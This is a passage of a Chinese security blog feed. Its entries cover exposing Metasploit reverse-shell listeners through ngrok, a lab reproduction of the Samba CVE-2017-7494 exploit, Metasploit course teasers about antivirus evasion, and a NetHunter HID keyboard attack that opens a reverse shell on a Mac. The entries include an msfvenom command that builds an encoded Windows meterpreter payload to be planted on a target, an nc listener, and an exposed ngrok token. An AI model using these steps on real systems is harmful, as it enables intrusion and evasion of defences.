      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ngrok&amp;MSF(内网穿)</title>
      <link href="/ngrok.html"/>
      <url>/ngrok.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5049644-hacker-computer-hacking.jpg" alt="enter description here"></p><span id="more"></span><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=467344119&auto=0&height=66"></iframe>## 视频演示：<iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ngrok_msf1.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="实例讲解"><a href="#实例讲解" class="headerlink" title="实例讲解"></a>实例讲解</h2><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00."></a>0x00.</h2><p>少宇师傅前阵子发了一篇ngrok的文章，由于没时间 ，也没去测试，现在正好有时间过来测试下。<br><a href="http://www.github.com/jas502n">www.github.com/jas502n</a><br>感谢少宇师傅的耐心教导。<br>&nbsp;<br> ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放.<br>Ngrok的下载地址:<a href="https://ngrok.com/download">https://ngrok.com/download</a><br>下面以我的Mac os X 为例子，下载ngrok。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496151747254.jpg" alt="enter description here"><br>&nbsp;<br>解压后得出，ngrok包<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496151934414.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01."></a>0X01.</h2><p>我选择将ngrok复制到&#x2F;bin<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496152066374.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0X02-HTTP"><a href="#0X02-HTTP" class="headerlink" title="0X02.HTTP"></a>0X02.HTTP</h2><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496152312190.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="1-安装你的token"><a href="#1-安装你的token" class="headerlink" title="1.安装你的token"></a>1.安装你的token</h2><p>&nbsp;</p><pre>ngrok  authtoken  6RBm_2CfWq3xAJ3XVK</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496152403046.jpg" alt="enter description here"><br>&nbsp;<br>根据官方文档 使用http的时候 使用ngrok http 80(将本地80端口映射到ngrok外网)，比如我们本机开启了80端口（apache）需要映射到外网。</p><p>开启XAMPP apache服务 80端口<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496153564256.jpg" alt="enter description here"></p><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496153547966.jpg" alt="enter description here"><br>&nbsp;<br>本机中的localhost<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496153815620.jpg" alt="enter description here"><br>&nbsp;<br>图中可以看到，已将本机的80端口映射到 ngrok.io中</p><pre>ngrok http 80</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0747E02D-A926-41A2-9CB4-BA2A3891F09D.png" alt="enter description here"><br>&nbsp;<br>我们可以来验证下： <a href="http://xxxx571a.ngrok.io/">http://xxxx571a.ngrok.io</a> 中是否有映射。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AAC3906C-F13E-4D13-9ADB-E20DFFDF0626.png" alt="enter description here"><br>&nbsp;<br>打开web 控制台，可以查看状态<br><a href="http://127.0.0.1:4040/inspect/http">http://127.0.0.1:4040/inspect/http</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154262914.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;</p><h2 id="0x03-TCP"><a href="#0x03-TCP" class="headerlink" title="0x03 TCP"></a>0x03 TCP</h2><p>&nbsp;<br>配置完了Ngrok  上个试了下http，我再来试试TCP<br>&nbsp;<br>我们使用 ngrok 帮助参数 tcp<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154592299.jpg" alt="enter description here"><br>&nbsp;<br>ngrok tcp 2222 将本机的2222映射到ngrok的外网中。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154448600.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496154532851.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0x04-Metasploit"><a href="#0x04-Metasploit" class="headerlink" title="0x04 Metasploit"></a>0x04 Metasploit</h2><p>配置msf马<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/24086F68-D41C-4AFD-98D1-158B33B269DB.png" alt="enter description here"><br>&nbsp;</p><pre>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=52.15.xxx.xx(ip填写对应的ngrok对应的ip)  LPORT=1629x(端口填写对应的ngrok的映射的端口)  -f exe > demon.exe</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1496157985712.jpg" alt="enter description here"><br>&nbsp;<br>放入目标机子上得到反弹<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/96D47762-CF00-478F-BD1B-42A1009F6D34.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现CVE-2017-7494&amp;msf</title>
      <link href="/CVE-2017-7494.html"/>
      <url>/CVE-2017-7494.html</url>
      
        <content type="html"><![CDATA[<p>​    Samba远程代码执行漏洞（CVE-2017-7494）分析，可靠的发现和利用Java反序列化漏洞，Pwn2own漏洞分享系列：利用macOS内核漏洞逃逸Safari沙盒  ，macOS下Nylas邮件客户端的命令执行漏洞，ios开发中常见的安全漏洞，chrome V8越界读写漏洞分析，利用可信文档实现PDF UXSS，利用DNS 隧道进行C＆C通信</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE20177494.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<h2 id="靶机环境：docker——samba"><a href="#靶机环境：docker——samba" class="headerlink" title="靶机环境：docker——samba"></a>靶机环境：docker——samba</h2><p>docker——samba 下载地址 <a href="https://github.com/Medicean/VulApps/tree/master/s/samba/1">https://github.com/Medicean/VulApps/tree/master/s/samba/1</a><br>攻击者：kali2017</p><h2 id="1-使用docker搭建（linux-samba）"><a href="#1-使用docker搭建（linux-samba）" class="headerlink" title="1.使用docker搭建（linux_samba）"></a>1.使用docker搭建（linux_samba）</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495712415922.jpg" alt="enter description here"></p><pre>docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1</pre><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711192757.jpg" alt="enter description here"></p><p>下载完后 ，并已经开启了docker samba。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711339447.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711364621.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711420205.jpg" alt="enter description here"></p><h2 id="2-使用exploit-CVE-2017-7494-msf-ruby"><a href="#2-使用exploit-CVE-2017-7494-msf-ruby" class="headerlink" title="2.使用exploit_CVE-2017-7494(msf-ruby)"></a>2.使用exploit_CVE-2017-7494(msf-ruby)</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711652052.jpg" alt="enter description here"></p><p>CVE-2017-7494 项目地址：<a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb">https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb</a></p><ol><li>手动将代码复制下来并且保存is_known_pipename.rb，以及将ruby脚本复制到 kali的&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;samba&#x2F;</li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711634905.jpg" alt="enter description here"></p><p>2.开启msf，并使用is_known_pipename模块</p><pre>msf > use exploit/linux/samba/is_known_pipename</pre><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711823764.jpg" alt="enter description here"></p><p>3.我们使用options ，需要我们设置哪些参数</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711865503.jpg" alt="enter description here"></p><p>这边我们可以看到只需要我们设置目标ip地址即可。</p><p>3.设置靶机ip地址</p><pre>set RHOST 192.168.1.102</pre><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1495711987547.jpg" alt="enter description here"></p><p>4.执行攻击</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D170DE7C-4EEE-4DED-BD41-3F108CC72FFF.png" alt="enter description here"></p><p>5.验证漏洞是否利用成功</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/546C9888-E498-4D68-B077-43434459C591.png" alt="enter description here"></p><p>可以看到该漏洞的威力</p><p> 参考：链接<a href="http://www.tuicool.com/articles/baeyYvV">http://www.tuicool.com/articles/baeyYvV</a><br><a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb">https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb</a><br>docker——samba 下载地址 <a href="https://github.com/Medicean/VulApps/tree/master/s/samba/1">https://github.com/Medicean/VulApps/tree/master/s/samba/1</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第七课</title>
      <link href="/msf7.html"/>
      <url>/msf7.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter.1280x600.jpg" alt="enter description here"></p><span id="more"></span><p>时过多个月也终于迎来了我的第七课，说真的 不是我更新慢，而是因工作上的许许多多事情忙不过，真心对不住了各位。<br>&nbsp;</p><h1 id="Metasploit系列课程第七课"><a href="#Metasploit系列课程第七课" class="headerlink" title="Metasploit系列课程第七课"></a>Metasploit系列课程第七课</h1><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26421042&auto=0&height=66"></iframe>预览版 : http://www.ggsec.cn/avoidz.html&nbsp;同时放上个人的secist_script   v1.5 ----------github 项目地址 ：https://github.com/demonsec666/secist_script&nbsp;脚本还在改进优化，各位有什么建议可以私聊我&nbsp;Metasploit系列课程第七课 百度云地址：链接: https://pan.baidu.com/s/1hsBVp44 密码: zsqw![enter description here][2]&nbsp;![enter description here][3]&nbsp;![enter description here][4]&nbsp;![enter description here][5]]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第七课预览版</title>
      <link href="/avoidz.html"/>
      <url>/avoidz.html</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26418123&auto=0&height=66"></iframe>## 视频演示：<iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/avoidz%20Metasploit%20PAYLOAD.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<h2 id="Metasploit系列课程第七课预览版"><a href="#Metasploit系列课程第七课预览版" class="headerlink" title="Metasploit系列课程第七课预览版"></a>Metasploit系列课程第七课预览版</h2><p>啥也不多说 先上图了，暂且有些短短期待，过段时间奉献自己的Metasploit系列课程第七课，这段时间有自己的太多事情要处理，时间上太多了不允许，前阵子还有些感冒发烧，实在抱歉。拖了有阵子了<br>&nbsp;<br>&nbsp;<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/44615DFD-F66F-4F02-BB15-FE2423840DAF.png" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0C2A807D-1CF7-4692-BF1D-5291539DAD02.png" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BD049896-0D40-42CE-8E5A-0EE4B6EE69DA.png" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/FCA08714-CA45-4C4B-AE7A-959EB616B4A2.png" alt="enter description here"></p><p>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第六课</title>
      <link href="/Metasploit6.html"/>
      <url>/Metasploit6.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/maxresdefault-1.jpg" alt="enter description here"></p><span id="more"></span><p>由于我的工作关系的，导致了课程更新缓慢，也是实在抱歉，过段时间我再将更新完整版的内容，首先看段我即将要讲的课程的内容！！！<br>增加几个powershell渗透点<br>第6课 metasploit&amp;powershell<br>链接: <a href="https://pan.baidu.com/s/1pLyiRLx">https://pan.baidu.com/s/1pLyiRLx</a> 密码: cvsv<br>课程作业：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/56427456-93B0-4712-B1E3-032182084091.png" alt="enter description here"><br><br><br>Metasploit 系列课程整合 链接: <a href="https://pan.baidu.com/s/1dFzPkJZ">https://pan.baidu.com/s/1dFzPkJZ</a> 密码: evwg</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第六课预览版</title>
      <link href="/secist-script.html"/>
      <url>/secist-script.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/secist_script.png" alt="enter description here"></p><span id="more"></span><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=473940676&auto=1&height=66"></iframe><br>由于我的工作关系的，导致了课程更新缓慢，也是实在抱歉，过段时间我再将更新完整版的内容，首先看段我即将要讲的课程的内容！！！Secist_scriptv1.4增加几个powershell渗透点第6课 metasploit&powershell 预览版，请看演示<h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p>可观看个人演示的视频</p><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/secist_script.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑手第三篇----DuckHunterHID for mac</title>
      <link href="/DuckHunterHID.html"/>
      <url>/DuckHunterHID.html</url>
      
        <content type="html"><![CDATA[<p>  继上一篇nethunter 的HID键盘攻击之后，我打算在我的mac上进行HID攻击，（<a href="http://www.ggsec.cn/nethuner-HID.html">http://www.ggsec.cn/nethuner-HID.html</a> ） 这次使用到的是USB-DuckHunter-HID，下面请看背景知识回顾—————–》</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=31209890&auto=0&height=66"></iframe>0x00## HID 键盘攻击在这个视频键盘HID攻击被证明。它可以在几秒钟内通过USB将目标解锁机器。它通过模拟键盘和鼠标，盲目地键入受控命令，轻击鼠标指针并使鼠标点击武器。这是什么？几乎每台包括台式机，笔记本电脑，平板电脑和智能手机的电脑都通过键盘输入人类。这就是为什么有一个称为HID或人机接口设备的无处不在的USB标准的规范。简单地说，声称是Keyboard HID的任何USB设备将被大多数现代操作系统自动检测和接受。无论是Windows，Mac，Linux还是Android设备，键盘都是King。<p>通过利用这种固有的信任，脚本敲击的速度超过每分钟1000字，传统的对策可以被这个不知疲倦的骑兵绕过 - USB攻击。</p><h2 id="DuckHunter-HID"><a href="#DuckHunter-HID" class="headerlink" title="DuckHunter HID"></a>DuckHunter HID</h2><p>DuckHunter HID选项允许您快速方便地将USB Rubber Ducky脚本转换为NetHunter HID攻击格式。您可以从示例预设菜单中选择一个选项，或从Duck Toolkit站点中选择更多选择的预配置脚本。<br>进攻安全人员再次出现。受欢迎的Pentesting发行版Kali Linux的构建者为Android设备推出了一款名为Kali NetHunter的新工具。该工具是一种移动分销，旨在在Android手机上安装并运行时通过USB危及系统。</p><p>该工具可以通过HID风格的攻击伪装成键盘，发出命令以打开其他攻击中的管理外壳，包括BadUSB中间人风格的攻击。该工具的图片目前可用于Nexus设备，但其他Android设备的构建可能正在进行中。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1zdsvb8.jpg" alt="enter description here"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>   <span style="color: #ff0000;"> 首先我们来看下，黑手（kali_nethunter）的duck_HID 给我们提供了哪些默认的脚本。</p><ol><li><p>首先呢 我们可以看到在nethunter客户端上可以看到有（DuckHunter HID ）字样，其实他就是模拟黄鸭，USB Rubber Ducky脚本转换为NetHunter HID攻击格式。</span></p><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3B83EDEB-6401-47BD-97AC-F67EBA4912F1.png" alt="enter description here"></p><p> 在默认的选项我们可以看到他给我们提供了默认的几个选项，其中有两个脚本呢 是针对Mac OSX 的HID攻击，攻击后呢<br> 返回一个shell连接，这里其中有perl和Ruby两个脚本，我们就选择其中一个选择ruby。<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9DA2E76E-459B-4295-902B-3EF8FF5F87B2.png" alt="enter description here"></p></li></ol><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>选择ruby脚本。我们来简单的看下代码的意思<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1CF817DC-6562-446F-9850-D88922A5E14E.png" alt="enter description here"></p><p>0X03<br>1.COMMAND SPACE—–在mac的快捷键表示为搜索框搜索<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6A323763-0ACE-4230-8638-42AE41A643C9.png" alt="enter description here"></p><p>2.STRING terminal  ENTER——–输入字符串terminal 搜索终端，并按下回车<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/432C200A-9E1E-423E-A928-CC24DC452D75.png" alt="enter description here"></p><p>3.Command+n就是新建的快捷键，功能是新建一个项目，在不同程序有不同的新建项目种类。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/82B4B55D-25D0-4B43-91B9-3C587FF2B470.png" alt="enter description here"></p><p>4.在终端下输入字符串使用ruby socket建立服务端<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4F756B21-2BF7-4F64-929B-D1F2044789F8.png" alt="enter description here"></p><p>5.当然了在这段代码也我们提示了 使用netcat（nc ）建立监听 并返回会话，他这里0.0.0.0提示我们更改我们黑手nethunter的ip地址。<br>如：<br>查看黑手使用的ip<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/FF774580-92C6-4BFE-A2C0-3AE59A011A21.png" alt="enter description here"></p><p><strong><span style="color: #008000;">更改ip</span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1BB5C440-F798-4F15-B2F3-3830EFD44FA9.png" alt="enter description here"></p><p><strong><span style="color: #008000;">保存脚本</span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3F33287D-827C-4CC0-BFEE-FFA398CE9FBE.png" alt="enter description here"></p><h2 id="0X04"><a href="#0X04" class="headerlink" title="0X04"></a>0X04</h2><p>1.<strong><span style="color: #008000;">并且在终端中使用nc命令建立监听 </span>———nc -vv -l -p 1337<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DD63EB85-CE67-447A-A17E-D7E16EF7BB22.png" alt="enter description here"></p><p>2 .点击三角按钮，<strong><span style="color: #008000;">执行攻击</span>。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1833878B-24B2-48BD-8438-0EDD524619D7.png" alt="enter description here"></p><p>3.<strong><span style="color: #008000;">返回shell连接</span></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7DD01722-EC8C-43AD-94F9-3D7BF4A7398D.png" alt="enter description here"></p><p><span style="color: #008000;">最终结果：</span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9E207E32-F824-4000-BC11-7207FDA27AC1.png" alt="enter description here"></p><p>更多项目可在github–USBDucky 项目中寻找你需要的PAYLOAD。<br><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1492519263301.jpg" alt="enter description here"></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p>可观看个人演示的视频</p><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/DuckHunterHI.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/625CE7389F506CD27830E0AC9450F043.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/926EC2F4CAA40850C68695B568ED7C5E.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/958E71B5A3E801BBD876231B610B9B67.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0C3A8A27E4B981F504D4EA54E2BE8BFC.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> 近源渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> HID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第五课</title>
      <link href="/Metasploit%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B%E7%AC%AC%E4%BA%94%E8%AF%BE.html"/>
      <url>/Metasploit%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B%E7%AC%AC%E4%BA%94%E8%AF%BE.html</url>
      
        <content type="html"><![CDATA[<h2 id="Metasploit系列课程第五课"><a href="#Metasploit系列课程第五课" class="headerlink" title="Metasploit系列课程第五课"></a>Metasploit系列课程第五课</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27808359&auto=0&height=66"></iframe>1.msfvenom 模块实例讲解<p>2.编写上次未完成的脚本，参考我的编写思路</p><p>3.bypass_server绕过某安全防护，并建立坚挺返回回话。</p><p>由于忙于工作&#x2F;加班和学习，断更了这么长时间，也是非常抱歉！！！个人水平有限，讲的不是很到位，望各位多多包涵！！！！！<br>链接: <a href="https://pan.baidu.com/s/1nvRsd1v">https://pan.baidu.com/s/1nvRsd1v</a> 密码: ebpy ——————————ppt+编写的脚本+视频<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/msf5.png" alt="enter description here"></p><h2 id="彩蛋：个人编写完善该脚本！"><a href="#彩蛋：个人编写完善该脚本！" class="headerlink" title="彩蛋：个人编写完善该脚本！"></a>彩蛋：个人编写完善该脚本！</h2><p><a href="https://github.com/demonsec666/secist_script.git">https://github.com/demonsec666/secist_script.git</a></p><p>secist_script<br>v1.3<br>增加了 web_delivery 整个模块自动化填写ip和端口<br>增加主菜单，二级菜单，多个banner<br>增加自动检测msf等程序是否存在<br>增加循环菜单（主菜单、二级菜单）<br>菜单进行排版<br>增加将msf木马payload 注入正常文件<br>新增bypass_server（powershell）模块过免杀</p><p>更改代码请注明原作者<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/v.1.32.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/v1.31.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/v1.33.png" alt="enter description here"></p><h2 id="我们团队—-墨-根据我的一些框架-做的一些功能-v2-0"><a href="#我们团队—-墨-根据我的一些框架-做的一些功能-v2-0" class="headerlink" title="我们团队—-墨 根据我的一些框架 做的一些功能 v2.0"></a>我们团队—-墨 根据我的一些框架 做的一些功能 v2.0</h2><p><a href="https://github.com/Szrzvdny/secist_script/">https://github.com/Szrzvdny/secist_script/</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/v2.0.png" alt="enter description here"></p><h2 id="bypas-sserver-模块演示视频"><a href="#bypas-sserver-模块演示视频" class="headerlink" title="bypas_sserver 模块演示视频"></a>bypas_sserver 模块演示视频</h2><p>继web_delivery之后的绕过某安全防护的模块 </p><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/bypassserver.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第四课</title>
      <link href="/msf4.html"/>
      <url>/msf4.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Unknown.jpeg" alt="enter description here"></p><span id="more"></span><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="第四课：metasploit之绕过某安全防护-恶作剧三部曲-曲二"><a href="#第四课：metasploit之绕过某安全防护-恶作剧三部曲-曲二" class="headerlink" title="第四课：metasploit之绕过某安全防护(恶作剧三部曲,曲二)"></a>第四课：metasploit之绕过某安全防护(恶作剧三部曲,曲二)</h2><p>&nbsp;<br>免杀后门过某安全防护—-web_delivery<br>&nbsp;<br>由于忙于工作和学习，却断更了这么长时间，也是非常抱歉！！！个人水平有限，讲的不是很到位，望各位多多包涵！！！！！<br>这次针对web-delivery 这个模块进行了一次全面补充讲解。<a href="http://www.ggsec.cn/msf-web-delivery.html">http://www.ggsec.cn/msf-web-delivery.html</a><br><br></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=28157586&auto=0&height=66"></iframe>## 百度云附上视频+ppt+相关代码——链接: https://pan.baidu.com/s/1eR5BaBC 密码: ppjf<br>![enter description here][2]<br><p><a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a>    个人临时写的，对针对某个模块编写，简单的完成自动化脚本。（shell）<br><br><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D0265964-DCC5-4C80-879B-F4FA2A9038B3.png" alt="enter description here"><br><br><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B91D4717-4FDA-4E42-9459-70797127E558.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit系列课程第三课</title>
      <link href="/msf3.html"/>
      <url>/msf3.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-crack-passwords-part-3-using-hashcat.1280x600.jpg" alt="enter description here"></p><span id="more"></span><h2 id="第三课：metasploit之绕过某安全防护-恶作剧三部曲-曲一"><a href="#第三课：metasploit之绕过某安全防护-恶作剧三部曲-曲一" class="headerlink" title="第三课：metasploit之绕过某安全防护(恶作剧三部曲,曲一)"></a>第三课：metasploit之绕过某安全防护(恶作剧三部曲,曲一)</h2><p>免杀后门过某安全防护—-zirikatu</p><p>由于忙于工作和学习，却断更了这么长时间，也是非常抱歉！！！同样也是很久没更新歌单了</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1141860&auto=0&height=66"></iframe><p>以下含视屏链接以及一些ppt （附带了 解决msf数据库的一些问题—pentestbox）</p><p>链接:<a href="https://pan.baidu.com/s/1kUTgRMB">https://pan.baidu.com/s/1kUTgRMB</a> 密码:hhpk</p><p>亦可在线观看即刻官网在线视频：<a href="http://www.secist.com/videos/index.html">http://www.secist.com/videos/index.html</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E5%9B%BE%E7%89%87%201.png" alt="enter description here"></p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p>以下是针对两款主流的安全防护进行了简单的扫描以及绕过某安全防护的的效果图：</p><p><img 